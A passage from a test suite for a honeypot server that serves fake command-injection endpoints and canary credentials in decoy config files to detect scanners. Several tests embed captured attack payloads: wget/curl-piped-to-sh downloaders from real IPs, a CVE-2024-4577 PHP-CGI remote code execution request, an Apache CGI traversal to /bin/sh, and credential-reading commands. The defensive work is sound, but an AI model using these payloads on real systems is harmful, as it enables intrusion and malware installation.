    for path in ["/", "/admin", "/admin/", "/admin/config.php.bak", "/printenv.php", "/etc/printenv"]:
        assert not tbenv.is_cmd_injection_path(path), f"unexpected match: {path}"


def test_cmd_injection_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "CMD_INJECTION_ENABLED", False)
    assert not tbenv.is_cmd_injection_path("/admin/config")
    assert not tbenv.is_cmd_injection_path("/printenv")


def test_classify_cmd_injection_command_creds():
    for cmd in (
        "cat /root/.aws/credentials",
        "cat ~/.aws/credentials",
        "cat /home/ubuntu/.aws/credentials",
        "  cat   /root/.aws/credentials  ",
    ):
        assert tbenv.classify_cmd_injection_command(cmd) == "creds-aws", cmd


def test_classify_cmd_injection_command_aws_config():
    assert tbenv.classify_cmd_injection_command("cat /root/.aws/config") == "creds-aws-config"


def test_classify_cmd_injection_command_passwd_env_id_uname():
    assert tbenv.classify_cmd_injection_command("cat /etc/passwd") == "passwd"
    assert tbenv.classify_cmd_injection_command("cat /etc/shadow") == "passwd"
    assert tbenv.classify_cmd_injection_command("printenv") == "env"
    assert tbenv.classify_cmd_injection_command("env") == "env"
    assert tbenv.classify_cmd_injection_command("id") == "id"
    assert tbenv.classify_cmd_injection_command("whoami") == "whoami"
    assert tbenv.classify_cmd_injection_command("uname -a") == "uname"
    assert tbenv.classify_cmd_injection_command("uname") == "uname"
    assert tbenv.classify_cmd_injection_command("hostname") == "hostname"
    assert tbenv.classify_cmd_injection_command("pwd") == "pwd"
    assert tbenv.classify_cmd_injection_command("ls -la") == "ls"


def test_classify_cmd_injection_command_unknown():
    assert tbenv.classify_cmd_injection_command("rm -rf /") == "unknown"
    assert tbenv.classify_cmd_injection_command("nonsense") == "unknown"
    assert tbenv.classify_cmd_injection_command("") == ""


def test_extract_cmd_injection_command_prefers_query_then_form():
    src, key, cmd = tbenv.extract_cmd_injection_command(
        {"cmd": ["whoami"]}, {"cmd": ["id"]},
    )
    assert (src, key, cmd) == ("query", "cmd", "whoami")
    src, key, cmd = tbenv.extract_cmd_injection_command(
        {}, {"command": ["whoami"]},
    )
    assert (src, key, cmd) == ("form", "command", "whoami")
    src, key, cmd = tbenv.extract_cmd_injection_command({}, {})
    assert (src, key, cmd) == ("", "", "")


def test_render_printenv_dump_embeds_aws_canary():
    body = tbenv.render_printenv_dump(FAKE_TRACEBIT, host="victim.example").decode("utf-8")
    assert "AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01" in body
    assert "HOSTNAME=victim.example" in body
    # Per-hit unique synthetic DB password — must not be a fixed literal.
    body2 = tbenv.render_printenv_dump(FAKE_TRACEBIT, host="victim.example").decode("utf-8")
    pw1 = next(line for line in body.split("\n") if line.startswith("DATABASE_URL="))
    pw2 = next(line for line in body2.split("\n") if line.startswith("DATABASE_URL="))
    assert pw1 != pw2, "DATABASE_URL must contain a per-hit-unique password"


def test_render_printenv_dump_sanitises_host_header():
    """An attacker-controlled Host can't smuggle newlines/control chars or
    `=` (which would forge a fake env line) into the dump."""
    body = tbenv.render_printenv_dump(
        FAKE_TRACEBIT, host="victim.example\nINJECTED=yes",
    ).decode("utf-8")
    # The newline and `=` are stripped — the leftover chars get appended to
    # the hostname token but can't break out of the line.
    hostname_lines = [ln for ln in body.split("\n") if ln.startswith("HOSTNAME=")]
    assert len(hostname_lines) == 1, f"hostname must be one line: {hostname_lines}"
    # Two lines named SERVER_NAME and HOSTNAME — both share the sanitized host.
    server_name_lines = [ln for ln in body.split("\n") if ln.startswith("SERVER_NAME=")]
    assert len(server_name_lines) == 1
    # No control character survived.
    assert "\n" not in hostname_lines[0]


async def test_dispatch_admin_config_no_cmd_returns_landing(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "CMD_INJECTION_ENABLED", True)
    resp = await flux_client.get(
        "/admin/config",
        headers={"X-Forwarded-For": "203.0.113.80"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "Admin Configuration" in text
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "cmd-injection-probe"
    assert entries[-1]["cmd"] == ""
    assert entries[-1]["cmdFamily"] == ""


async def test_dispatch_admin_config_cmd_creds_issues_canary(flux_client, monkeypatch):
    """cat /root/.aws/credentials → AWS canary in the response body, logged
    as cmd-injection-creds-leak with cmdFamily=creds-aws."""
    monkeypatch.setattr(tbenv, "CMD_INJECTION_ENABLED", True)
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
    resp = await flux_client.get(
        "/admin/config?cmd=cat%20/root/.aws/credentials",
        headers={"X-Forwarded-For": "203.0.113.81"},
    )
    assert resp.status == 200
    body = await resp.read()
    assert b"AKIAFAKEEXAMPLE01" in body, body
    assert b"aws_secret_access_key" in body
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "cmd-injection-creds-leak"
    assert entry["cmdFamily"] == "creds-aws"
    assert entry["cmdSource"] == "query"
    assert entry["cmdKey"] == "cmd"
    assert entry["canaryStatus"] == "issued"


async def test_dispatch_admin_config_cmd_passwd_returns_static(flux_client, monkeypatch):
    """Non-credential commands return static fake output and do NOT mint a
    Tracebit canary."""
    monkeypatch.setattr(tbenv, "CMD_INJECTION_ENABLED", True)
    # No API_KEY needed — no canary is issued for /etc/passwd.
    monkeypatch.setattr(tbenv, "API_KEY", "")
    resp = await flux_client.get(
        "/admin/config?cmd=cat%20/etc/passwd",
        headers={"X-Forwarded-For": "203.0.113.82"},
    )
    assert resp.status == 200
    body = await resp.read()
    assert b"root:x:0:0:root" in body
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "cmd-injection-command"
    assert entry["cmdFamily"] == "passwd"


async def test_dispatch_admin_config_cmd_id_uses_simulate(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "CMD_INJECTION_ENABLED", True)
    resp = await flux_client.get(
        "/admin/config?cmd=id",
        headers={"X-Forwarded-For": "203.0.113.83"},
    )
    assert resp.status == 200
    body = await resp.read()
    assert b"uid=33(www-data)" in body


async def test_dispatch_admin_config_php_cmd_id_uses_same_handler(flux_client, monkeypatch):
    """The current log pass found scanners using the PHP-suffixed variant
    of the same exposed admin-config shape."""
    monkeypatch.setattr(tbenv, "CMD_INJECTION_ENABLED", True)
    resp = await flux_client.get(
        "/admin/config.php?cmd=id",
        headers={"X-Forwarded-For": "203.0.113.89"},
    )
    assert resp.status == 200
    body = await resp.read()
    assert b"uid=33(www-data)" in body
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "cmd-injection-command"
    assert entry["cmdInjectionPath"] == "/admin/config.php"


async def test_dispatch_printenv_always_issues_canary(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "CMD_INJECTION_ENABLED", True)
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
    resp = await flux_client.get(
        "/printenv",
        headers={"X-Forwarded-For": "203.0.113.84"},
    )
    assert resp.status == 200
    body = await resp.read()
    assert b"AWS_SECRET_ACCESS_KEY=" in body
    assert b"AKIAFAKEEXAMPLE01" in body
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "cmd-injection-printenv"
    assert entry["cmdFamily"] == "env"


async def test_dispatch_cgi_bin_printenv_routes_through_handler(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "CMD_INJECTION_ENABLED", True)
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
    resp = await flux_client.get(
        "/cgi-bin/printenv",
        headers={"X-Forwarded-For": "203.0.113.85"},
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "cmd-injection-printenv"


async def test_dispatch_admin_config_form_post_extracts_cmd(flux_client, monkeypatch):
    """POST with form-encoded body should also surface the cmd value."""
    monkeypatch.setattr(tbenv, "CMD_INJECTION_ENABLED", True)
    resp = await flux_client.post(
        "/admin/config",
        data="cmd=whoami",
        headers={
            "X-Forwarded-For": "203.0.113.86",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["cmdSource"] == "form"
    assert entry["cmd"] == "whoami"


async def test_dispatch_cmd_injection_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "CMD_INJECTION_ENABLED", False)
    resp = await flux_client.get("/admin/config?cmd=id", headers={"X-Forwarded-For": "203.0.113.87"})
    assert resp.status == 404
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "not-handled"


async def test_cmd_injection_canary_failure_falls_back_to_static(flux_client, monkeypatch):
    """If Tracebit issuance fails for a creds-aws cmd, log it but still 200
    with an empty body (no canary leaked, no 502 to tip off the scanner)."""
    monkeypatch.setattr(tbenv, "CMD_INJECTION_ENABLED", True)
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")

    async def _failed(*_a, **_kw):
        return None

    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _failed)
    resp = await flux_client.get(
        "/admin/config?cmd=cat%20/root/.aws/credentials",
        headers={"X-Forwarded-For": "203.0.113.88"},
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["canaryStatus"] == "issue-failed"
    assert entry["cmdFamily"] == "creds-aws"


async def test_dispatch_phpunit_eval_get_body_returns_probe_hash(flux_client):
    payload = b'<?php echo(md5("Hello PHPUnit"));'
    resp = await flux_client.request(
        "GET",
        "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        data=payload,
        headers={"X-Forwarded-For": "203.0.113.90"},
    )
    assert resp.status == 200
    body = await resp.text()
    assert body == hashlib.md5(b"Hello PHPUnit").hexdigest() + "\n"
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "phpunit-eval-stdin"
    assert entry["bodyBytesRead"] == len(payload)
    assert entry["bodySha256"] == hashlib.sha256(payload).hexdigest()
    assert entry["bodyPreview"].startswith("<?php echo")


async def test_dispatch_php_cgi_rce_decodes_body_command(flux_client):
    command = b"(wget -qO- https://46.151.182.82/sh || curl -sk https://46.151.182.82/sh) | sh"
    encoded = base64.b64encode(command).decode("ascii")
    payload = (
        '<?php shell_exec(base64_decode("%s")); '
        'echo(md5("Hello CVE-2024-4577")); ?>'
    ) % encoded
    resp = await flux_client.post(
        "/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
        data=payload,
        headers={"X-Forwarded-For": "203.0.113.91"},
    )
    assert resp.status == 200
    assert await resp.text() == hashlib.md5(b"Hello CVE-2024-4577").hexdigest() + "\n"
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "cmd-injection-php-cgi-rce"
    assert entry["cmdSource"] == "body"
    assert entry["cmdKey"] == "php://input"
    assert "46.151.182.82" in entry["decodedCommand"]


async def test_dispatch_apache_cgi_shell_body_logs_stdin_command(flux_client):
    payload = b"(wget --no-check-certificate -qO- https://204.76.203.196/sh || curl -sk https://204.76.203.196/sh) | sh -s apache.selfrep"
    resp = await flux_client.post(
        "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh",
        data=payload,
        headers={"X-Forwarded-For": "203.0.113.92"},
    )
    assert resp.status == 200
    assert await resp.read() == b""
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "cmd-injection-apache-cgi-shell"
    assert entry["cmdSource"] == "body"
    assert entry["cmdKey"] == "stdin"
    assert "204.76.203.196" in entry["cmd"]


# --- PHP-CGI bare-path liveness probe ---


@pytest.mark.parametrize("path", [
    "/cgi-bin/php",
    "/cgi-bin/php-cgi",
    "/cgi-bin/php.cgi",
    "/cgi-bin/php5",
    "/cgi-bin/php5-cgi",
    "/cgi-bin/php5.cgi",
    "/cgi-bin/php7",
    "/cgi-bin/php7-cgi",
    "/cgi-bin/php7.cgi",
    "/cgi-bin/php8",
    "/cgi-bin/php8-cgi",
    "/cgi-bin/php8.cgi",
    "/cgi-bin/",
    "/cgi-bin",
    "/CGI-BIN/PHP",  # case-insensitive
])
def test_php_cgi_liveness_path_matches(path):
    assert tbenv.is_php_cgi_liveness_path(path), f"expected liveness match: {path}"


@pytest.mark.parametrize("path", [
    # Paths the exploit/cmd-injection handlers own — must not be
    # claimed by the liveness handler so the existing trap chain
    # keeps the priority it has today.
    "/cgi-bin/printenv",
    "/cgi-bin/test-cgi",
    "/cgi-bin/luci/;stok=/locale",  # OpenWrt LuCI, unrelated CVE
    "/cgi-bin/nas_sharing.cgi",     # D-Link NAS, unrelated CVE
    "/cgi-bin/.%2e/.%2e/.%2e/bin/sh",  # Apache CGI traversal
    "/cgi-bin/index.php",
    "/cgi-bin/admin.php",
    "/php",                          # not under /cgi-bin/
    "/",
])
def test_php_cgi_liveness_path_does_not_match(path):
    assert not tbenv.is_php_cgi_liveness_path(path), f"unexpected match: {path}"


def test_php_cgi_liveness_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "PHP_CGI_LIVENESS_ENABLED", False)
    assert not tbenv.is_php_cgi_liveness_path("/cgi-bin/php")


async def test_dispatch_php_cgi_liveness_get_returns_apache_php_fingerprint(flux_client):
    resp = await flux_client.get(
        "/cgi-bin/php",
        headers={"X-Forwarded-For": "203.0.113.93"},
    )
    assert resp.status == 200
    body = await resp.read()
    # Body matches what real Apache + PHP-CGI returns when invoked
    # without arguments — scanners gate on this exact shape.
    assert body == b"<br />\n<b>No input file specified.</b>\n"
    # Windows + Apache + PHP fingerprint is the actual bait.
    assert "PHP/" in resp.headers.get("Server", "")
    assert "Win" in resp.headers.get("Server", "")
    assert resp.headers.get("X-Powered-By", "").startswith("PHP/")
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "php-cgi-liveness"
    assert entry["phpCgiLivenessPath"] == "/cgi-bin/php"
    assert entry["phpCgiLivenessMethod"] == "GET"


async def test_dispatch_php_cgi_liveness_bare_dir_also_traps(flux_client):
    resp = await flux_client.get(
        "/cgi-bin/",
        headers={"X-Forwarded-For": "203.0.113.94"},
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "php-cgi-liveness"
    assert entry["phpCgiLivenessPath"] == "/cgi-bin/"


async def test_dispatch_php_cgi_liveness_does_not_shadow_existing_php_cgi_rce(flux_client):
    """The CVE-2024-4577 exploit POST (auto_prepend_file=php://input
    in query + PHP body) must still land in the body-RCE handler,
    not the liveness handler — that's where the canary fires."""
    payload = b'<?php echo(md5("Hello CVE-2024-4577")); ?>'
    resp = await flux_client.post(
        "/cgi-bin/php?%2D%64+allow_url_include%3Don+%2D%64+auto_prepend_file%3Dphp%3A%2F%2Finput",
        data=payload,
        headers={"X-Forwarded-For": "203.0.113.95"},
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "cmd-injection-php-cgi-rce"


async def test_dispatch_php_cgi_liveness_does_not_shadow_existing_apache_cgi_shell(flux_client):
    payload = b"(wget -qO- https://198.51.100.7/sh) | sh"
    resp = await flux_client.post(
        "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh",
        data=payload,
        headers={"X-Forwarded-For": "203.0.113.96"},
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "cmd-injection-apache-cgi-shell"


async def test_dispatch_php_cgi_liveness_does_not_shadow_existing_printenv(flux_client):
    """/cgi-bin/printenv stays with cmd-injection (which mints the
    Tracebit AWS canary in the printenv-shape env block) — the
    liveness handler must not steal that path."""
    resp = await flux_client.get(
        "/cgi-bin/printenv",
        headers={"X-Forwarded-For": "203.0.113.97"},
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"].startswith("cmd-injection")


# --- wp-config suffix-variant expansion ---


def test_wp_config_canary_covers_editor_leftover_suffixes():
    """The April 2026 not-handled audit found .save / .swp / .~ / .bak / .txt
    variants outnumbering the bare /wp-config.php — make sure the canary trap
    intercepts every plausible save/swap/comment shape."""
    for path in (
        "/wp-config.php.save",
        "/wp-config.php.swp",
        "/wp-config.php.swo",
        "/wp-config.php.old",
        "/wp-config.php.orig",
        "/wp-config.php.txt",
        "/wp-config.php~",
        "/wp-config.bak",
    ):
        assert tbenv.find_canary_trap(path) is not None, f"missing trap: {path}"


# --- sftp-config canary trap ---


def test_sftp_config_paths_registered():
    for path in (
        "/.vscode/sftp.json",
        "/sftp-config.json",
        "/sftp.json",
        "/.ftpconfig",
    ):
        trap = tbenv.find_canary_trap(path)
        assert trap is not None, f"missing trap: {path}"
        assert trap.name == "sftp-config"


def test_render_sftp_config_json_embeds_gitlab_credentials():
    body = tbenv.render_sftp_config_json(FAKE_TRACEBIT)
    payload = json.loads(body)
    assert payload["username"] == "deploybot42"
    assert payload["password"] == "p@ssCanaryValue"
    assert payload["protocol"] == "sftp"


async def test_dispatch_sftp_config_returns_canary_json(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
    resp = await flux_client.get(
        "/.vscode/sftp.json",
        headers={"X-Forwarded-For": "203.0.113.90"},
    )
    assert resp.status == 200
    body = await resp.json()
    assert body["password"] == "p@ssCanaryValue"
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "sftp-config"


# --- CI/CD config canary trap ---


def test_ci_cd_config_paths_registered():
    expected = {
        "/.github/workflows/deploy.yml": "github-actions-workflow",
        "/.github/workflows/ci.yml": "github-actions-workflow",
        "/.github/workflows/docker.yml": "github-actions-workflow",
        "/.gitlab-ci.yml": "gitlab-ci",
        "/.gitlab/.gitlab-ci.yml": "gitlab-ci",
        "/Jenkinsfile": "jenkinsfile",
        "/bitbucket-pipelines.yml": "bitbucket-pipelines",
        "/appveyor.yml": "generic-ci-config",
        "/.circleci/config.yml": "generic-ci-config",
        "/azure-pipelines.yml": "generic-ci-config",
        "/deployment.yml": "generic-ci-config",
    }
    for path, name in expected.items():
        trap = tbenv.find_canary_trap(path)
        assert trap is not None, f"missing trap: {path}"
        assert trap.name == name


async def test_dispatch_github_actions_workflow_returns_canary_yml(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
    resp = await flux_client.get(
        "/.github/workflows/ci.yml",
        headers={"X-Forwarded-For": "203.0.113.91"},
    )
    assert resp.status == 200
    body = await resp.text()
    assert "AWS_ACCESS_KEY_ID: AKIAFAKEEXAMPLE01" in body
    assert "aws s3 sync" in body
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "github-actions-workflow"


# --- AI editor / coding-assistant config canary expansion ---


def test_ai_toolchain_config_paths_registered():
    """Late-April 2026 dictionary expansion: AI editor + coding-assistant
    + AI infrastructure config paths."""
    expected = {
        "/.claude/settings.json": "claude-settings",
        "/.cline/settings.json": "cline-settings",
        "/.cline/mcp_settings.json": "mcp-config",
        "/mcp_settings.json": "mcp-config",
        "/mcp.json": "mcp-config",
        "/.mcp/mcp.json": "mcp-config",
        # Filename variants — scanner dictionaries fan out across
        # `config.json` and `settings.json` alongside the canonical
        # `mcp.json` because the MCP protocol leaves the on-disk
        # filename up to the host application. `mcp_config.json`
        # is the underscore variant of `mcp.json`.
        "/.mcp/config.json": "mcp-config",
        "/.mcp/settings.json": "mcp-config",
        "/.cursor/mcp_config.json": "mcp-config",
        "/.continue/config.json": "continue-config",
        "/.sourcegraph/cody.json": "cody-config",
        "/.aider.conf.yml": "aider-conf",
        "/.config/open-interpreter/config.yaml": "open-interpreter-config",
        "/litellm_config.yaml": "litellm-config",
        "/litellm/config.yaml": "litellm-config",
        "/proxy_config.yaml": "litellm-config",
        "/langsmith.env": "langsmith-env",
        "/.huggingface/token": "huggingface-token",
        "/.cache/huggingface/token": "huggingface-token",
        "/.streamlit/secrets.toml": "streamlit-secrets",
        "/openai.json": "openai-config-flat",
        "/anthropic.json": "anthropic-config-flat",
        "/cohere_config.json": "ai-provider-config",
        "/tabnine_config.json": "ai-provider-config",
        "/.bito/config.json": "ai-provider-config",
        "/.codeium/config.json": "ai-provider-config",
        "/.roost/config.json": "ai-provider-config",
        "/pinecone_config.json": "ai-provider-config",
        "/.lobechat/config.json": "ai-provider-config",
        "/chatgpt-next-web.json": "ai-provider-config",
        "/baseten.yaml": "baseten-config",
    }
    for path, name in expected.items():
        trap = tbenv.find_canary_trap(path)
        assert trap is not None, f"missing trap: {path}"
        assert trap.name == name, f"{path} mapped to {trap.name}, expected {name}"


def test_render_claude_settings_embeds_aws_canary():
    body = tbenv.render_claude_settings_json(FAKE_TRACEBIT)
    payload = json.loads(body)
    assert payload["apiKey"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    assert payload["anthropicApiKey"] == "AKIAFAKEEXAMPLE01"
    # MCP servers stanza ships canary as GitHub PAT — same shape as
    # the existing /.cursor/mcp.json renderer.
    pat = payload["mcpServers"]["github"]["env"]["GITHUB_PERSONAL_ACCESS_TOKEN"]
    assert pat == "AKIAFAKEEXAMPLE01"


def test_render_cline_settings_embeds_aws_canary():
    body = tbenv.render_cline_settings_json(FAKE_TRACEBIT)
    payload = json.loads(body)
    assert payload["apiProvider"] == "anthropic"
    assert payload["apiKey"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    assert payload["openAiApiKey"] == "AKIAFAKEEXAMPLE01"


def test_render_continue_config_embeds_aws_canary_per_model():
    body = tbenv.render_continue_config_json(FAKE_TRACEBIT)
    payload = json.loads(body)
    keys = {m["apiKey"] for m in payload["models"]}
    assert "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in keys
    assert "AKIAFAKEEXAMPLE01" in keys


def test_render_cody_config_embeds_aws_canary():
    body = tbenv.render_cody_config_json(FAKE_TRACEBIT)
    payload = json.loads(body)
    assert payload["accessToken"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    assert payload["endpoint"].startswith("https://")


def test_render_aider_conf_embeds_aws_canary():
    body = tbenv.render_aider_conf_yml(FAKE_TRACEBIT).decode("utf-8")
    assert "openai-api-key: AKIAFAKEEXAMPLE01" in body
    assert "anthropic-api-key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in body


def test_render_open_interpreter_yaml_embeds_aws_canary():
    body = tbenv.render_open_interpreter_yaml(FAKE_TRACEBIT).decode("utf-8")
    assert "api_key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in body
    assert "provider: anthropic" in body


def test_render_litellm_config_embeds_aws_canary_in_model_list():
    body = tbenv.render_litellm_config_yaml(FAKE_TRACEBIT).decode("utf-8")
    assert "api_key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in body
    assert "api_key: AKIAFAKEEXAMPLE01" in body
    assert "master_key: FwoGZXIvYXdzEXAMPLEFAKE=" in body
    assert "model_list:" in body


def test_render_litellm_db_password_is_per_hit_random():
    """LiteLLM proxy config embeds a Postgres URL — the password must be a
    per-hit synthetic, never a fixed literal across the fleet."""
    body1 = tbenv.render_litellm_config_yaml(FAKE_TRACEBIT).decode("utf-8")
    body2 = tbenv.render_litellm_config_yaml(FAKE_TRACEBIT).decode("utf-8")
    # Two renders should produce different DB passwords. Extract by regex.
    m1 = re.search(r"postgres://litellm:([^@]+)@", body1)
    m2 = re.search(r"postgres://litellm:([^@]+)@", body2)
    assert m1 and m2
    assert m1.group(1) != m2.group(1), "DB password must be per-hit unique, not a fixed literal"


def test_render_langsmith_env_embeds_aws_canary():
    body = tbenv.render_langsmith_env(FAKE_TRACEBIT).decode("utf-8")
    assert "LANGSMITH_API_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in body
    assert "LANGCHAIN_API_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in body


def test_render_huggingface_token_is_aws_canary_string():
    """HF tokens are single-line, no newline."""
    body = tbenv.render_huggingface_token(FAKE_TRACEBIT)
    assert body == b"AKIAFAKEEXAMPLE01"


def test_render_streamlit_secrets_toml_embeds_aws_canary():
    body = tbenv.render_streamlit_secrets_toml(FAKE_TRACEBIT).decode("utf-8")
    assert 'OPENAI_API_KEY = "AKIAFAKEEXAMPLE01"' in body
    assert 'ANTHROPIC_API_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"' in body
    assert "[database]" in body


def test_render_streamlit_db_password_is_per_hit_random():
    body1 = tbenv.render_streamlit_secrets_toml(FAKE_TRACEBIT).decode("utf-8")
    body2 = tbenv.render_streamlit_secrets_toml(FAKE_TRACEBIT).decode("utf-8")
    m1 = re.search(r'\[database\][^\[]*password = "([^"]+)"', body1, re.S)
    m2 = re.search(r'\[database\][^\[]*password = "([^"]+)"', body2, re.S)
    assert m1 and m2
    assert m1.group(1) != m2.group(1), "Streamlit DB password must be per-hit unique"


# --- Azure CLI credential cache (June 2026) ---


def test_render_azure_profile_embeds_aws_canary_at_sp_subscription():
    profile = json.loads(tbenv.render_azure_profile_json(FAKE_TRACEBIT))
    subs = profile["subscriptions"]
    sp = next(s for s in subs if s["user"]["type"] == "servicePrincipal")
    assert sp["user"]["name"] == "AKIAFAKEEXAMPLE01"


def test_render_azure_profile_per_hit_unique_guids():
    p1 = json.loads(tbenv.render_azure_profile_json(FAKE_TRACEBIT))
    p2 = json.loads(tbenv.render_azure_profile_json(FAKE_TRACEBIT))
    assert p1["installationId"] != p2["installationId"]
    assert p1["subscriptions"][0]["tenantId"] != p2["subscriptions"][0]["tenantId"]
    assert p1["subscriptions"][0]["id"] != p2["subscriptions"][0]["id"]
    assert p1["subscriptions"][0]["user"]["name"] != p2["subscriptions"][0]["user"]["name"]


def test_render_azure_access_tokens_embed_aws_canary():
    entries = json.loads(tbenv.render_azure_access_tokens_json(FAKE_TRACEBIT))
    assert isinstance(entries, list) and entries
    e = entries[0]
    assert e["tokenType"] == "Bearer"
    assert e["accessToken"] == "AKIAFAKEEXAMPLE01"
    assert e["refreshToken"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    assert e["resource"] == "https://management.core.windows.net/"


def test_render_azure_access_tokens_per_hit_unique():
    e1 = json.loads(tbenv.render_azure_access_tokens_json(FAKE_TRACEBIT))[0]
    e2 = json.loads(tbenv.render_azure_access_tokens_json(FAKE_TRACEBIT))[0]
    assert e1["_clientId"] != e2["_clientId"]
    assert e1["_authority"] != e2["_authority"]
    assert e1["oid"] != e2["oid"]
    assert e1["userId"] != e2["userId"]


def test_render_azure_msal_cache_embeds_aws_canary_in_secret():
    cache = json.loads(tbenv.render_azure_msal_token_cache_json(FAKE_TRACEBIT))
    at_entries = list(cache["AccessToken"].values())
    rt_entries = list(cache["RefreshToken"].values())
    assert at_entries and at_entries[0]["secret"] == "AKIAFAKEEXAMPLE01"
    assert rt_entries and rt_entries[0]["secret"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    assert at_entries[0]["credential_type"] == "AccessToken"
    assert rt_entries[0]["credential_type"] == "RefreshToken"


def test_render_azure_msal_cache_per_hit_unique():
    c1 = json.loads(tbenv.render_azure_msal_token_cache_json(FAKE_TRACEBIT))
    c2 = json.loads(tbenv.render_azure_msal_token_cache_json(FAKE_TRACEBIT))
    assert list(c1["AccessToken"].keys()) != list(c2["AccessToken"].keys())
    assert list(c1["Account"].keys()) != list(c2["Account"].keys())


def test_render_azure_service_principal_embeds_aws_canary():
    entries = json.loads(tbenv.render_azure_service_principal_entries_json(FAKE_TRACEBIT))
    assert isinstance(entries, list) and entries
    e = entries[0]
    assert e["client_secret"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    # Per-hit unique client_id and tenant.
    e2 = json.loads(tbenv.render_azure_service_principal_entries_json(FAKE_TRACEBIT))[0]
    assert e["client_id"] != e2["client_id"]
    assert e["tenant"] != e2["tenant"]


def test_render_azure_cli_config_embeds_aws_canary_in_storage_key():
    body = tbenv.render_azure_cli_config(FAKE_TRACEBIT).decode("utf-8")
    assert "[cloud]" in body
    assert "[storage]" in body
    assert "key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in body
    # The connection_string also carries the canary as the AccountKey.
    assert "AccountKey=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in body


def test_render_azure_cli_config_per_hit_unique_account():
    b1 = tbenv.render_azure_cli_config(FAKE_TRACEBIT).decode("utf-8")
    b2 = tbenv.render_azure_cli_config(FAKE_TRACEBIT).decode("utf-8")
    m1 = re.search(r"^account = (\S+)$", b1, re.M)
    m2 = re.search(r"^account = (\S+)$", b2, re.M)
    assert m1 and m2 and m1.group(1) != m2.group(1)


def test_render_azure_clouds_config_no_credential_literal():
    """clouds.config has no real credential slot in real-world content;
    the trap exists so a `.azure/` directory walk doesn't see a partial
    install. Body should NOT embed the AWS canary."""
    body = tbenv.render_azure_clouds_config(FAKE_TRACEBIT)
    assert b"AKIAFAKEEXAMPLE01" not in body
    assert b"wJalrXUtnFEMI" not in body
    assert b"[AzureCloud]" in body


def test_azure_cli_paths_registered():
    """All six Azure CLI credential / profile paths route to a CanaryTrap.

